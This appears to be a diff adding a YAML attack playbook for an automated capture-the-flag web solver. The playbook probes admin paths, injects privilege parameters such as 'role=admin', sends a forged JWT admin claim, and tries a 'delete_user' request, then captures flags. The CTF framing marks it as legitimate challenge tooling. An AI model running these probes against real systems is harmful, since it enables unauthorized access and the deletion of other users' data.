@@ -1,0 +1,171 @@
+id: web_privilege_escalation
+name: Privilege Escalation
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits vulnerabilities allowing a user to gain unauthorized access to resources or functions
+  with higher privileges (vertical) or access data belonging to other users (horizontal, beyond basic IDOR).
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+stop_on_flag: true
+
+confidence_seeds:
+  - if: "any(p in context.found_paths for p in ['/admin', '/dashboard', '/settings', '/manage', '/config'])"
+    boost: 0.20
+    label: "Admin-related path found"
+  - if: "any(p in context.params for p in ['role', 'admin', 'is_admin', 'user_id', 'account_type'])"
+    boost: 0.15
+    label: "Privilege-related parameter found"
+  - if: "any(h in context.headers for h in ['Authorization', 'Cookie']) and 'jwt' in context.tech_stack"
+    boost: 0.10
+    label: "Authorization header or JWT detected"
+
+detection_paths:
+  - id: direct_admin_path_access_probe
+    name: Direct admin path access probe
+    description: >
+      Attempts to access common admin/privileged paths without explicit authorization.
+    min_confidence: 0.10
+    steps:
+      - id: try_admin_paths
+        action: http_probe
+        params:
+          inject_into: path
+          payloads:
+            - '/admin'
+            - '/dashboard'
+            - '/settings'
+            - '/manage'
+            - '/config'
+            - '/administrator'
+        signals:
+          - match: '(?i)admin(istration)?|dashboard|settings|management' # Look for keywords in response body
+            on_match:
+              confidence_boost: 0.30
+              emit: admin_panel_accessible
+          - match: '200' # Check for successful access without explicit login
+            in: status_code
+            on_match:
+              confidence_boost: 0.20
+              emit: unexpected_access_status
+
+  - id: parameter_tampering_privilege_probe
+    name: Parameter tampering for privilege escalation
+    description: >
+      Modifies common parameters to attempt to elevate privileges (e.g., 'role=admin', 'is_admin=true').
+    min_confidence: 0.20
+    steps:
+      - id: tamper_privilege_params
+        action: http_probe
+        params:
+          inject_into: all_params # Try in query, body, and cookies
+          payloads:
+            # Common parameters and values for privilege escalation
+            - 'role=admin'
+            - 'role=administrator'
+            - 'is_admin=true'
+            - 'admin=true'
+            - 'user_type=admin'
+            - 'account_type=premium' # Generic escalation attempt
+        signals:
+          - match: '(?i)admin(istration)?|premium|manager' # Keywords indicating successful privilege change
+            on_match:
+              confidence_boost: 0.45
+              emit: parameter_privilege_elevated
+          - match: '200' # Check for successful request with modified parameters
+            in: status_code
+            on_match:
+              confidence_boost: 0.25
+              emit: param_tampering_status_ok
+
+  - id: jwt_admin_claim_probe
+    name: JWT admin claim modification probe
+    description: >
+      Attempts to modify JWT 'admin' claim to true to gain administrative access.
+      Requires the application to use JWT for authorization.
+    min_confidence: 0.30
+    steps:
+      - id: modify_jwt_admin_claim
+        action: http_probe
+        params:
+          inject_into: header # Assuming JWT is in Authorization header or Cookie
+          header_name: 'Authorization' # Or 'Cookie'
+          # Placeholder for JWT payload modification. Actual payload generation would be external.
+          # This assumes a pre-signed JWT with a modified 'admin' claim.
+          # Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJhZG1pbiI6dHJ1ZX0.SIGNATURE
+          payloads:
+            - 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.SIGNATURE_PLACEHOLDER' # Example: modified admin claim
+        signals:
+          - match: '(?i)admin(istration)?|dashboard|settings'
+            on_match:
+              confidence_boost: 0.40
+              emit: jwt_admin_claim_bypass
+
+exploitation_paths:
+  - id: confirm_admin_access
+    name: Confirm Administrative Access
+    requires_signal: admin_panel_accessible
+    technique: vertical_privilege_escalation
+    description: >
+      Successfully accessed what appears to be an administrative panel without explicit authorization.
+    steps:
+      - id: check_admin_page_for_flag
+        action: http_probe
+        params:
+          inject_into: path
+          payloads:
+            - '/admin' # Re-probe admin path for flag
+            - '/admin/flag'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: confirm_elevated_privileges_via_params
+    name: Confirm Elevated Privileges via Parameter Tampering
+    requires_signal: parameter_privilege_elevated
+    technique: parameter_tampering
+    description: >
+      Request parameters were successfully tampered with to achieve elevated privileges.
+    steps:
+      - id: verify_elevated_status
+        action: http_probe
+        params:
+          # Perform an action that would require elevated privileges and check response
+          # This step would need to be tailored to the specific challenge
+          inject_into: vulnerable_param # Placeholder
+          payloads:
+            - 'action=delete_user&user_id=1' # Example: attempt to delete another user
+        capture:
+          - pattern: 'User 1 deleted successfully' # Example confirmation
+            as: privilege_action_confirmed
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: confirm_elevated_privileges_via_jwt
+    name: Confirm Elevated Privileges via JWT Tampering
+    requires_signal: jwt_admin_claim_bypass
+    technique: jwt_privilege_escalation
+    description: >
+      JWT modification (e.g., admin claim) successfully granted elevated privileges.
+    steps:
+      - id: verify_jwt_privilege_action
+        action: http_probe
+        params:
+          # Perform an action that would require elevated privileges using the tampered JWT
+          inject_into: header
+          header_name: 'Authorization'
+          payloads:
+            - 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.SIGNATURE_PLACEHOLDER' # Re-send tampered JWT
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
